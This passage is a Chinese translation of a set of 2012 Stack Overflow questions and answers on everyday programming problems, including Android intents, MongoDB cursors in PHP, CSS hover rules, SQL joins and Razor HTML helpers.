点击时，设置其他页面的 SelectedMailingList 属性，然后导航到该页面。

看看这个样本..我使用相同的机制.. [http://wp7pivottest.codeplex.com/](http://wp7pivottest.codeplex.com/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:29:21.320

我建议传递下面链接中描述的导航查询字符串参数

[http://forums.silverlight.net/t/223044.aspx](http://forums.silverlight.net/t/223044.aspx)

[http://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationcontext.querystring(v=vs.95).aspx](http://msdn.microsoft.com/en-us/library/system.windows.navigation.navigationcontext.querystring(v=vs.95).aspx)

很容易实现，希望对你有帮助

# python - 在 python 包安装期间调用外部脚本

> ID：11603918
> 
> 赞同：1
> 
> 时间：2012-07-22T20:55:03.137
> 
> 标签：python, setup.py

我有兴趣为我的应用程序构建 Windows 发行版。

该应用程序需要设置多个环境变量和/或注册表项，以使软件正常运行。假设我编写了一个脚本“set_vars.py”来创建和设置这些条目，有没有办法在安装应用程序时调用这个脚本

```
python setup.py install 
```

从详细说明“setup.py”的文档中，我没有看到调用安装前或安装后脚本的明显方法。

我宁愿不从发行版中的**init** .py 调用 set_vars.py，因为这些变量只需要在安装时设置一次。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-11-28T15:54:54.197

假设您已经编写了所需的操作脚本，您可以只`--install-script=set_vars.py`调用`setup.py`，或者，甚至更好（为了方便），将选项添加到您的`setup.cfg`文件中。

# sugarcrm - 想要为 sugarcrm 定制进口

> ID：11603934
> 
> 赞同：0
> 
> 时间：2012-07-22T20:57:08.737
> 
> 标签：sugarcrm

我是 sugarcrm 的新手，我需要做的第一件事就是弄清楚将一些自定义数据导入到我目前在系统中拥有的一些潜在客户中。在查看了网站上的开发者信息之后，很快我就意识到自己需要很长时间才能解决这个问题。

我要导入的数据将希望完全导入并添加到特定潜在客户的新历史项目中。我们正在对 crm 之外的潜在客户执行一些操作，我想批量更新 crm 数据并将其存储在历史记录中。

我在想一个好地方可能是在潜在客户的导入窗口中。也许在“您想对导入的数据做什么？”的区域添加另一个无线电选项。然后添加进程来处理这种类型的导入。

另一种可能性是用于上传和处理的新选项卡。

我目前不确定最好的方法，因为我正在学习如何为糖添加功能。

我真的可以使用一些指导来了解可能是最好的方法，也许还有一些指向我可以在哪里找到更多信息的指针。

顺便说一下，这是 CE 版本 6.5

谢谢您的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T03:56:36.610

如果您真的有自定义导入要求，总有像 Talend 这样的工具可供查看，但我有点想知道您有哪些内置工具无法处理的要求？它应该能够很好地导入自定义字段。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-07-24T20:50:11.030

我过去用过Sugar，我不得不说它总是一团糟。客户服务也确实欠缺。老实说，我在 2 个月内取消了我的帐户。

# google-apps-script - 在 Google 电子表格应用程序脚本的 onEdit() 函数中使用 ScriptDB 查询

> ID：11603938
> 
> 赞同：0
> 
> 时间：2012-07-22T20:57:44.730
> 
> 标签：google-apps-script, google-sheets

所以

我收到此错误

> 糟糕，您无权调用查询（第 7 行）

当我尝试在 Google 电子表格应用程序脚本中的 onEdit() 函数中查询 ScriptDB 数据库时。以下是我用来获取可重复错误的代码：

```
function onEdit(){
  //tell me event has happened
  Browser.msgBox("onEdit() Fired")
  //get ScriptDB reference
  var db = ScriptDb.getMyDb();
  //perform any query
  var results = db.query({})
} 
```

将 onEdit() 替换为 notonEdit() 并在手动触发时按预期工作。

```
function notonEdit(){
  //tell me event has happened
  Browser.msgBox("notonEdit() Fired")
  //get ScriptDB reference
  var db = ScriptDb.getMyDb();
  //perform any query
  var results = db.query({})
} 
```

是否存在某种我未正确设置的权限，或者是否不允许 ScriptDB 查询在设计的事件函数中起作用？其他人看到这个问题吗？

汤姆

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T22:31:17.603

有两种方法可以将脚本附加到 onEdit 触发器：(1) 为您的函数选择名称 onEdit 或 (2) 在脚本编辑器中，转到 Resources>Current Script's Triggers 并添加 notonEdit/From spreadsheet/On edit。(2) 对你应该没问题。请参阅[指南](https://developers.google.com/apps-script/understanding_triggers)了解 (1) 和 (2) 之间的区别。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T22:33:57.600

> 是否存在某种我未正确设置的权限，或者是否不允许 ScriptDB 查询在设计的事件函数中起作用？

我相信是后者。所谓的[简单触发器](https://developers.google.com/apps-script/understanding_triggers)在它们可以访问的内容上有些限制，因为它们是作为活动用户运行的。如果没有这个限制，就会有一个相当大的安全漏洞。

# php - PHP，从不同的foreach获取不同的数组值

> ID：11603940
> 
> 赞同：0
> 
> 时间：2012-07-22T20:58:04.777
> 
> 标签：php, arrays, algorithm, multidimensional-array

我很迷茫，在下面的代码中：

```
while($row = mysqli_fetch_object($result)){
        $similar_games[$row->game_id]['id'][] = $row->id;
        $similar_games[$row->game_id]['name'][] = $row->name;
        $similar_games[$row->game_id][$type] = 0;
    }
        foreach($similar_games as $originalGameKey => $originalGame){
            //Can be a case where union gets unset, and not populated.  scares ksort();
            $union = array();
            $similar_values = array();

            $union = $similar_concepts; 

            foreach($originalGame['id'] as $similarGameKey => $similarGame){
                if(!isset($union[$similarGame])){
                    $union[] = $similarGame;
                }
            }
            foreach($originalGame['id'] as $similarGameKey => $similarGame){
                if(isset($union[$similarGame])){
                    $similar_values[] = $similarGame;
                }
            }
            $similar_games[$originalGameKey]["union"] = $similar_values;
       } 
```

在这条线上`$similar_values[] = $similarGame;`我试图得到`$row->name`而不是`$row->id`

但我不知道如何使基于 ['id'] 的 foreach 访问 ['name'] 值。

如果这太令人困惑，我可以尝试澄清，但我自己在这里遇到了麻烦。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:54:09.923

我只是改变了：

```
foreach($originalGame['id'] as $similarGameKey => $similarGame){
                if(isset($union[$similarGame])){
                    $similar_values[] = $similarGame;
                }
            }
            $similar_games[$originalGameKey]["union"] = $similar_values; 
```

至：

```
for($i = 0; $i<count($originalGame['id']);$i++){
                if(isset($union[$originalGame['id'][$i]])){
                    $similar_values[] = $originalGame['name'][$i];
                }
            }
            $similar_games[$originalGameKey]["union"] = $similar_values; 
```

# ios - 存储大量图像数据的位置比 NSUserDefaults 更好

> ID：11603942
> 
> 赞同：1
> 
> 时间：2012-07-22T20:58:17.083
> 
> 标签：ios, nsuserdefaults

我用来`NSUserDefaults`通过编码存储图像数据。我知道它可以保存在 Documents 目录中，但是如果内容太大，这将导致 App Store 拒绝，因为 iCloud 同步问题。它也可以保存在缓存目录中，但我保存的图像非常重要，我不想在缓存清除时丢失它们。

我担心我的应用程序会因为大量使用`NSUserDefaults`数据存储而被拒绝——在离线环境中是否有其他方法来处理这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T21:09:22.430

`NSUserDefaults`不适合存储图像。您应该将这些存储在`~/Library/Application Support`. 既然您说您不希望它们被备份，您应该按照[iOS App Programming Guide](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Conceptual/iPhoneOSProgrammingGuide/PerformanceTuning/PerformanceTuning.html)中的说明进行操作：

> 在 iOS 5.1 及更高版本中，将支持文件存储在 /Library/Application Support 目录中，并使用 setResourceValue:forKey:error: 方法将 NSURLIsExcludedFromBackupKey 属性添加到相应的 NSURL 对象。（如果您使用 Core Foundation，请使用 CFURLSetResourcePropertyForKey 函数将 kCFURLIsExcludedFromBackupKey 键添加到您的 CFURLRef 对象。）应用此属性可防止将文件备份到 iTunes 或 iCloud。如果您有大量支持文件，您可以将它们存储在自定义子目录中，并将扩展属性仅应用于该目录。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T21:02:59.997

我不能说拒绝，但 NSUserDefaults 几乎肯定是错误的。（它适用于用户偏好数据。）

我建议你看看核心数据。

这是最近的一个论点：http: [//sealedabstract.com/code/you-should-use-core-data/](http://sealedabstract.com/code/you-should-use-core-data/)

很酷的报价：

> 如果您在没有链接到 CoreData.framework 的情况下将 3 个以上的对象保存到磁盘，那么您做错了。

希望有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T21:11:37.787

[这个问题](https://stackoverflow.com/questions/8209406/ios-5-does-not-allow-to-store-downloaded-data-in-documents-directory)的公认答案可能会有所帮助。

针对您的问题，给出的要点：

> 将文件放在 Documents 中，但将它们标记为不备份。有一个关于如何做到这一点的技术说明（QA1719）。

# php - php mongodb 发现不工作

> ID：11603952
> 
> 赞同：3
> 
> 时间：2012-07-22T20:59:48.327
> 
> 标签：php, mongodb, xampp, mongodb-php

**解决了**

为了查看数据，我在游标上做了一个 var_dump，你必须先遍历游标来 var_dump 它。

```
foreach($user_images as $image) {
     var_dump($image)
} 
```

可以在以下位置了解更多信息：

[http://php.net/manual/en/class.mongocursor.php](http://php.net/manual/en/class.mongocursor.php)

**/解决了**

我的 MongoDB 中有一个名为“user_image”的集合。我正在使用 PHP 5.3 和 mongoDB db v2.0.5，pdfile 版本 4.5。我的 XAMPP 中有这个设置。我只是想找到集合中的所有文档。当我运行下面的信息时，即使我可以在运行 db.user_image.find() 的终端中确认它返回结果，也没有任何返回。

```
$m = new Mongo();
$db = $m->selectDB('dev_app');
$collection = new MongoCollection($db, 'user_image');
$collection->find(); 
```

如果我将查询更改为通过 user_uuid 简单地使用 findOne，我会得到一个结果！下面的例子：

```
$collection->findOne(array('user_uuid' => 'de977803-f198-416a-8806-acbc1fa3f718')); 
```

这是集合 user_image 中的示例文档：

```
{
    "_id" : ObjectId("500c3f13ab8692ced0d9df6f"),
    "user_uuid" : "de977803-f198-416a-8806-acbc1fa3f718",
    "image_name" : "4a5e286e101429da0a3c3a576ffa4878.jpg",
    "image_url" : "/uploaded_files/files/4a5e286e101429da0a3c3a576ffa4878.jpg",
    "sm_thumb_url" : "/uploaded_files/thumbnails/4a5e286e101429da0a3c3a576ffa4878.jpg",
    "md_thumb_url" : "/uploaded_files/files/4a5e286e101429da0a3c3a576ffa4878.jpg",
    "lg_thumb_url" : "/uploaded_files/files/4a5e286e101429da0a3c3a576ffa4878.jpg",
    "status" : "A",
    "created" : ISODate("2012-07-22T17:57:36.835Z"),
    "modified" : ISODate("2012-07-22T17:57:36.835Z"),
    "created_by_uuid" : "de977803-f198-416a-8806-acbc1fa3f718",
    "modified_by_uuid" : "de977803-f198-416a-8806-acbc1fa3f718"
} 
```

我在查找查询中缺少什么？谁能帮我？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2019-07-26T01:53:37.903

# 光标对象是这里的“关键”

find() 方法将`$cursor = $collection->find();`返回一个光标对象。现在您可以使用 toArray() 方法来获取数据。 `$dataArray = $cursor->toArray();`就那么简单。**或者使用foreach一个一个的获取文档**。附言。FindOne() 返回一个数组。

[https://www.php.net/manual/en/class.mongodb-driver-cursor.php](https://www.php.net/manual/en/class.mongodb-driver-cursor.php)

# android - 未找到处理 Intent { act=.Southwest } 的活动

> ID：11603957
> 
> 赞同：1
> 
> 时间：2012-07-22T21:00:36.507
> 
> 标签：android, android-intent, android-activity

我对 Android 很陌生，我遇到了一个问题。我不断收到 No Activity found to handle Intent 错误。我正在尝试通过单击按钮开始一项新活动。

我查看了所有其他答案，它们要么对问题非常具体，例如，答案不适用于我的问题，要么是说要确保活动名称匹配，我的做法是。

显现

```
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.madonk.louisiana.festivals"
    android:installLocation="auto"
    android:versionCode="1"
    android:versionName="1.0" >

    <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" />

    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">

        <activity
            android:name=".MainActivity"
            android:label="@string/title_activity_main" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>        
         </activity>

        <activity
            android:name=".Southwest"
            android:label="@string/title_activity_southwest" >

        </activity>

    </application>

</manifest> 
```

主要活动

> ```
> package com.madonk.louisiana.festivals;
> 
> import android.os.Bundle; 
> import android.app.Activity; 
> import android.content.Intent; 
> import android.view.Menu; 
> import android.view.View; 
> import android.widget.Button;
> 
> public class MainActivity extends Activity {
> 
> @Override
> public void onCreate(Bundle savedInstanceState) {
>     super.onCreate(savedInstanceState);
>     setContentView(R.layout.activity_main);
> 
>   Button southwest = (Button) findViewById(R.id.button_southwest);
>   southwest.setOnClickListener(new View.OnClickListener() {
> 
>       public void onClick(View v) {
>           // TODO Auto-generated method stub
>           startActivity(new Intent());            }       });
> }
> 
> @Override
> public boolean onCreateOptionsMenu(Menu menu) {
>     getMenuInflater().inflate(R.menu.activity_main, menu);
>     return true;
> } } 
> ```

日志猫

```
 07-22 21:08:35.179: E/AndroidRuntime(470): FATAL EXCEPTION: main
07-22 21:08:35.179: E/AndroidRuntime(470): android.content.ActivityNotFoundException: No Activity found to handle Intent { act=.Southwest }
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1409)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.app.Instrumentation.execStartActivity(Instrumentation.java:1379)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.app.Activity.startActivityForResult(Activity.java:2827)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.app.Activity.startActivity(Activity.java:2933)
07-22 21:08:35.179: E/AndroidRuntime(470):  at com.madonk.louisiana.festivals.MainActivity$1.onClick(MainActivity.java:22)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.view.View.performClick(View.java:2485)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.view.View$PerformClick.run(View.java:9080)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.os.Handler.handleCallback(Handler.java:587)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.os.Handler.dispatchMessage(Handler.java:92)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.os.Looper.loop(Looper.java:123)
07-22 21:08:35.179: E/AndroidRuntime(470):  at android.app.ActivityThread.main(ActivityThread.java:3683)
07-22 21:08:35.179: E/AndroidRuntime(470):  at java.lang.reflect.Method.invokeNative(Native Method)
07-22 21:08:35.179: E/AndroidRuntime(470):  at java.lang.reflect.Method.invoke(Method.java:507)
07-22 21:08:35.179: E/AndroidRuntime(470):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
07-22 21:08:35.179: E/AndroidRuntime(470):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
07-22 21:08:35.179: E/AndroidRuntime(470):  at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T21:13:31.663

您没有显示开始活动的源代码。根据 LogCat 输出，我猜您正在尝试：

```
startActivity(new Intent(".Southwest")); 
```

相反，使用：

```
startActivity(new Intent(this, Southwest.class)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:16:32.323

您尚未发布任何代码，但我假设当您开始西南活动时，您可能正在创建`Intent`这样的内容：

```
Intent intent = new Intent(".Southwest"); 
```

这将创建一个`Intent`ACTION=".Southwest"。你想开始一个特定的类，所以你需要创建一个这样的显式`Intent`：

```
Intent intent = new Intent(this, Southwest.class); 
```

`Intent`这将为特定类创建一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T22:01:28.007

在此处发布以帮助其他偶然发现此问题的人

代码应该是

```
startActivity(new Intent(MainActivity.this, Southwest.class)); 
```

# javascript - 如何仅计算有效的 jquery 文件上传？

> ID：11603960
> 
> 赞同：1
> 
> 时间：2012-07-22T21:00:47.990
> 
> 标签：javascript, jquery, image-processing

[在使用jquery file upload 上传](https://github.com/blueimp/jQuery-File-Upload/wiki/Options)多个图像后，我正在尝试刷新我的上传页面。

我目前正在计算添加的文件数量，然后如果它们与成功上传的数量相匹配，那么我会刷新页面。在用户尝试上传无效的文件类型或太小的图像之前，这非常有效。我怎样才能将这些失败作为我的总数的一部分？有没有首选的方法来做到这一点？

```
 $('#fileupload').fileupload({
        acceptFileTypes: /(\.|\/)(jpe?g|png)$/i
    });

    var filesqueued = null; 
    var filesuploaded = 0;

    $('#fileupload').bind('fileuploadadd', function (e, data) {
        filesqueued = data.originalFiles.length;
    });

    $('#fileupload').bind('fileuploaddone', function (e, data) {
        filesuploaded = filesuploaded + 1;

        if (filesuploaded == filesqueued) {
            filesuploaded = 0;
            location.reload();
        }
    }) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-23T00:28:55.610

您可以使用 jQuery 文件上传的内置事件来绑定成功和失败事件：

```
$('#fileupload').bind('fileuploadcompleted', function (e, data) {
    /* Successful upload */
        filesuploaded = filesuploaded + 1;
});

$('#fileupload').bind('fileuploadfailed', function (e, data) {
    /* Failed upload */
    // [...]
}); 
```

更多来自他们的文档：[https ://github.com/blueimp/jQuery-File-Upload/wiki/Options](https://github.com/blueimp/jQuery-File-Upload/wiki/Options)

或者，您可以在服务器端执行所有操作。让您的上传处理程序（jQuery 文件上传`url`选项）响应：

```
<?php
if ( $valid == false ) {
    echo 'invalid';
    // or echo( json_encode( array( 'result' => 'invalid' ) ) );
} 
```

然后回到 jQuery 中分析返回的数据：

```
$('#fileupload').bind('fileuploaddone', function (e, data) {
    /* Check returned data */
    // Could use JSON or simple text output
    // if ( data.result == 'invalid' ) {
    if ( data == 'invalid' ) {
        // file did not pass
    } else {
        // file uploaded fine
        filesuploaded = filesuploaded + 1;
    }

    if (filesuploaded == filesqueued) {
        filesuploaded = 0;
        location.reload();
    }
}) 
```

# java - 如何找到两个纬度和对数之间的角度并将它们显示在圆圈上？

> ID：11603964
> 
> 赞同：1
> 
> 时间：2012-07-22T21:01:18.037
> 
> 标签：java, android, geometry

嘿，我有如下圆圈。Circle 有两个点 A(latitude1,longitude1) 和 B(latitude2,longitude2)。和两个（纬度，经度）对。其中一个是（Say A）是圆的中心点。现在我想通过计算角度在圆（B）上放置另一个点。请问我怎么能在android画布中做到这一点？现在要获得角度，我正在使用以下功能：

```
public double getAngle(double lat1, double lon1, double lat2, double lon2)
{
    double dx = lat2 - lat1;
    // Minus to correct for coord re-mapping
    double dy =  Math.cos(Math.PI/180*lat1)*(lon2 - lon1);

    double inRads = Math.atan2(dy,dx);

    if (inRads < 0)
        inRads = Math.abs(inRads);
    else
        inRads = 2*Math.PI - inRads;

    return inRads;
} 
```

上述函数是否正确获取角度？如果是，那么现在我如何在画布上显示该点？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-07-22T21:22:43.433

这`Math.cos()`是非常可疑的。为什么`dy`不简单`lon2 - lon1`？一旦你有了 inRads，你为什么还要摆弄它？`Math.atan2()`返回 -Pi 和 +Pi 之间的正确角度。

# html - 为什么这两个 DIV 相互重叠显示？

> ID：11603965
> 
> 赞同：0
> 
> 时间：2012-07-22T21:01:21.570
> 
> 标签：html, jquery-mobile

下面的代码将两个 DIV 混合在一起，而不是一个接一个地垂直显示它们。两者都设置为`display: block`，我想知道哪个样式属性使它们表现得像这样？！请参阅[jsfiddle 上的演示](http://jsfiddle.net/Cw86p/2/)。

```
<div data-role="page">
    <div  data-role="content">
        <div>
            <a href="#" data-role="button" data-inline="true" data-mini="true" style="float: left">Do something</a>

            <span href="#" style="float: right; border-radius: 10px; background-color: white; padding: .6em">Something</span>
        </div>

        <div>
            <ul data-role="listview">
                <li><a href="#">Foo list entry</a></li>
            </ul>
        </div>
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:13:11.333

使用浮动元素后，您必须使用包含**clear:both**样式的元素关闭它们，因此部分代码将是：

```
<div>
    <a href="#" data-role="button" data-inline="true" data-mini="true" style="float: left">Do something</a>

    <span href="#" style="float: right; border-radius: 10px; background-color: white; padding: .6em">Something</span>

    <div style="clear:both"></div>
</div> 
```

这是工作的 JSFiddle（也有一点边距修改）：http: [//jsfiddle.net/Cw86p/9/](http://jsfiddle.net/Cw86p/9/)

# jquery - 如何获取所有选中的复选框值？

> ID：11603967
> 
> 赞同：-2
> 
> 时间：2012-07-22T21:01:28.677
> 
> 标签：jquery, asp.net, checkbox

我有我的复选框控件，如图所示。

```
 <ItemTemplate>
                    <asp:CheckBox ID="chkdelete" runat="server" Text='<%# Bind("OrderNumber") %>' Font-Bold="false" />
   </ItemTemplate> 
```

我正在尝试使用 jQuery Ajax 调用删除多个网格视图记录。我正在尝试获取所有选中的复选框值，如图所示。

```
var checkboxes = [];
$('input:checkbox:checked').each(function() {
    checkboxes.push($(this).val());
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:40:09.320

我猜你想要`Text`复选框的属性，而不是值本身。这被放置在`label`旁边的元素中`input[type="checkbox"]`：

```
var checkboxes = [];
$('input:checkbox:checked').each(function() {
    checkboxes.push($(this).next().text());
}); 
```

我不确定 ASP.NET 是在输入之前还是之后放置标签，因此您可能需要使用`prev()`而不是`next()`.

# c++ - C++ - 选择最大“n”值

> ID：11603969
> 
> 赞同：0
> 
> 时间：2012-07-22T21:01:31.810
> 
> 标签：c++, algorithm, vector, max

> **可能重复：**
> [选择最大“n”值](https://stackoverflow.com/questions/11603786/selecting-the-maximum-n-values)

如果我们有以下代码：

```
 struct Features{ int F1, F2, F3, F4; };

    int criterionFunction(Features const& features) {
        return
            -2*features.F1*features.F2
            +3*features.F1
            +5*features.F2
            -2*features.F1*features.F2*features.F3
            +7*features.F3
            +4*features.F4
            -2*features.F1*features.F2*features.F3*features.F4; } 
```

您建议使用什么方法可以在应用 ti后检索**最大三个值**`criterionFunction()`？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-22T21:05:32.907

我认为您可以使用`std::partial_sort`它。例如：

```
 #include <algorithm>

 bool criterionGreater(Feature const& left, Feature const& right) { return criterionFunction(left) > criterionFunction(right); }

 std::partial_sort(yourVector.begin(), yourVector.begin() + 3, yourVector.end(), criterionGreater); 
```

那么 yourVector 中的前三件事应该是三个最大的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:07:12.137

我建议将值存储在 a 中`std::priority_queue`，以便可以直接使用前三个元素。

如果元素已经存储，您仍然可以使用优先级队列。遍历序列，如果`x`是当前元素

*   如果优先级队列的元素少于 3 个，则添加`x`到队列中
*   否则，如果队列的底部元素的值大于`x`，则不执行任何操作
*   否则将元素添加到队列中并删除底部的元素

一切都由标准库提供，你只需要提供你的比较函数

```
bool operator<(const Features& x, const Features& y)
{
    return criterionFunction(x) < criterionFunction(y);
} 
```

# python - 如何为在 Windows 7 上运行的 iPython 安装分发版？

> ID：11603976
> 
> 赞同：1
> 
> 时间：2012-07-22T21:03:03.400
> 
> 标签：python, ipython

我在没有分发的情况下在 Windows 7 上安装了 iPython。我读到没有分发，就没有 Python 启动菜单。而且，我无法弄清楚如何安装分发。

还有另一种运行 iPython 的方法吗？这真的让我很困扰。我似乎无法打开控制台！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:24:00.177

根据此[链接](http://python.6.n6.nabble.com/IPython-User-Incomplete-Windows-7-installation-td4380346.html)，您需要安装“分发”，因为它在 Windows 7 上是必需的。此链接还提供下载。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:15:34.430

这适用于我在 Windows 7 下使用 Python 3.2.3 和 IPython 0.12.1

```
 C:\Python32\Scripts\ipython3.exe 
```

你可以为它创建一个快捷方式。

或者，从 windows 命令 shell 中键入上述命令以启动 IPython。

# sql-server - MSSQL 数据解析

> ID：11603978
> 
> 赞同：0
> 
> 时间：2012-07-22T21:03:40.017
> 
> 标签：sql-server, linker

我不知道它叫什么，所以我将尝试解释一下。

假设有两个表，`tableA`并且`tableB`.

*   其中`tableA`有一列有一个数字（例如105）
*   在`tableB`其中有一列有文本（例如'This'）

105 的意思是“这个”。

所以一个数字存储在`A`表中 w/c 在表中是有意义的`B`。

我想得到这个`tableA`号码，但是当它显示出来时，它会显示“这个”。

逻辑：如果 A 的结果为 105，则显示来自 B 的等效文本，其中 id 为 105。显示：THIS

```
SELECT TOP 1
    CHAR_KEY AS charid,
    USER_KEY AS userid,
    CONVERT(VARCHAR,substring(char_data, 9, 16)) AS name,
    CONVERT(INT,cast(reverse(substring(char_data, 7, 2)) as BINARY(2))) AS level,
    CONVERT(INT,substring(char_data, 25, 1)) AS type,
    CONVERT(INT,cast(reverse(substring(char_data, 263, 2)) as BINARY(2))) AS strength,
    CONVERT(INT,cast(reverse(substring(char_data, 265, 2)) as BINARY(2))) AS wisdom,
    CONVERT(INT,cast(reverse(substring(char_data, 267, 2)) as BINARY(2))) AS dexterity,
    CONVERT(INT,cast(reverse(substring(char_data, 269, 2)) as BINARY(2))) AS charisma,
    CONVERT(INT,cast(reverse(substring(char_data, 271, 2)) as BINARY(2))) AS intelligence,
    CONVERT(INT,cast(reverse(substring(char_data, 273, 2)) as BINARY(2))) AS constitution,
    CONVERT(INT,cast(reverse(substring(char_data, 309, 4)) as BINARY(4))) AS fame,
    CONVERT(INT,cast(reverse(substring(char_data, 33, 4)) as BINARY(4))) AS guild,
    CONVERT(INT, substring(char_data, 261, 1)) AS permission
FROM CHAR_DATA0 WHERE CONVERT(INT, substring(char_data, 261, 1))=0x00 ORDER BY level DESC 
```

获取公会名称的查询。

```
SELECT 
    guild_name
FROM guild_data WHERE guild_key=guild 
```

我想要得到的是`guild`.

示例来自第一个 SELECT 查询`guild`结果：518

在表 guild_data 上，一列 guild_name 包含公会 518 的名称。518 是 guild_key。

请帮忙，谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:08:05.833

```
SELECT
    guild_data.guild_name
FROM CHAR_DATA0
inner join guild_data on guild_key = CONVERT(INT,cast(reverse(substring(char_data, 33, 4)) as BINARY(4)))
WHERE CONVERT(INT, substring(char_data, 261, 1))=0x00 ORDER BY level DESC 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:09:27.260

你需要一个“选择”和一个“加入”

```
 select b.text
  from tablea a 
  inner join tableb b on a.id = b.id
  where a.id = 105 
```

但是，要使这项工作正常进行，您需要在两个表中都有“id”。

# css - css中另一个类的悬停效果

> ID：11603980
> 
> 赞同：2
> 
> 时间：2012-07-22T21:04:58.703
> 
> 标签：css

我有一个菜单，其中活动项目在加载时有一个活动类，它改变了它的背景。

其他项目的悬停改变悬停项目的背景。

```
<ul>
  <li></li>
  <li class="active"></li>
  <li></li>
</ul>

<style>
  li:hover, li.active {background:black}
</style> 
```

有什么方法可以删除其他项目上的活动类背景悬停在纯 CSS 中。就像是：

```
li.hover .active {background:none} 
```

如果 active 在 li 下，这可以工作，但在这里不起作用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T21:18:14.297

这对于 CSS 来说是不可能的，因为 CSS 只能影响DOM 中*稍后*出现的元素，而不是以前出现的元素，因此将鼠标悬停在第*一个* 元素上会影响具有以下 CSS`li`的当前元素：`li.active`

```
li:hover ~ li.active {
    background-color: #f00; /* or whatever */
} 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/GNmPA/)。

但是将鼠标悬停在第三个`li` *上不能*影响相同的`li.active`元素。

但是，以下方法会起作用：

```
ul:hover li.active {
    background-color: transparent;
} 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/GNmPA/1/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T21:09:22.777

试试这个：

```
ul:not(:hover)>li.active { background: black; }
ul>li.active:not(:hover) { background: none; } 
```

这有几个条件：

1.  支持`:not`伪标签的浏览器
2.  `ul`不能有太多的填充或空白空间，否则您可以激活的`:hover`而不将`ul`鼠标悬停在任何`li`s

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2017-10-26T11:56:27.870

这对我有用：

```
.dvchange1 {
  color:#fff;
    }
    .dvOne:hover .dvchange2 {
        color:#000;
    }
```

```
 <div class="dvchange1 dvchange2">
    <span class="">
    Hello
    <span>
    </div>
```

# asp.net-mvc-3 - 在 razor html helper 中传递数据图标属性

> ID：11603985
> 
> 赞同：3
> 
> 时间：2012-07-22T21:05:40.200
> 
> 标签：asp.net-mvc-3, razor, html-helper

我想使用 asp.net mvc 3 razor html helper 来跟踪 html 代码：

```
<input type="text" .... .   placeholder="Login" data-icon="user" /> 
```

我试过这个：

```
@Html.TextBoxFor(m => m.UserName, new { placeholder = "Login", data-icon = "user" }) 
```

或者

```
@Html.TextBoxFor(m => m.UserName, new { placeholder = "Login", @data-icon = "user" }) 
```

显示错误：

```
Invalid anonymous type members declaration. 
```

这可能是由于数据图标中的破折号没有被视为属性。如何在文本框字段中添加数据图标属性。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-03-13T08:57:18.440

尝试这个

```
@Html.TextBoxFor(m => m.UserName, new { placeholder = "Login", data_icon = "user" }) 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-23T04:33:06.063

是的，你不能那样写，但你可以编写自己的扩展来解决这个问题。这是示例代码：

```
public static MvcHtmlString MyInput(this HtmlHelper htmlHelper, string name, string value, string icon)
    {
        var attrs = new Dictionary<string,object>();
        attrs.Add("data-icon", icon);
        return htmlHelper.TextBox(name, name, value, attrs);
    } 
```

或者你也可以像这样在剃须刀中使用：

```
@{
    var attrs = new Dictionary<string, object>();
    attrs.Add("placeholder","Login"); 
    attrs.Add("data-icon","user");
}
@Html.TextBoxFor(m => m.UserName, attrs) 
```

如果它对你有帮助，请不要忘记标记它的正确答案:-)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-30T13:20:42.537

这实际上与 vNext 的第二个替代方案相同，但如果您更喜欢内联编写它：

```
